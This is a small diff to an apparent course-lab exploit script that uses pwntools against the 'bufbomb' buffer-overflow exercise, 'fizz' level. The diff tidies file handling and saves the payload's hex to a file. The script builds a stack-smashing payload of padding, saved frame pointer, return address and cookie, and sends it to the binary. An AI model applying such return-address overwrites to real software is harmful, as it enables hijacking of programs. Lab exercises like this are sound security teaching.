@@ -1,8 +1,7 @@
 from pwn import *
 
-f = open("./ID", "r")
-id = f.read().splitlines()[0]
-f.close()
+with open('./ID', 'r') as f:
+    id = f.read().splitlines()[0]
 
 sh = process(['./bufbomb', '-u', id])
 
@@ -13,7 +12,8 @@ ebp = 0x556834a0
 
 exploit = flat(['a' * (length + 8), ebp, ret, cookie])
 
-print ' '.join(char.encode("hex") for char in exploit)
+with open('./fizz_{}.txt'.format(id), 'w') as f:
+    f.write(' '.join(char.encode('hex') for char in exploit))
 
 sh.sendline(exploit)
 
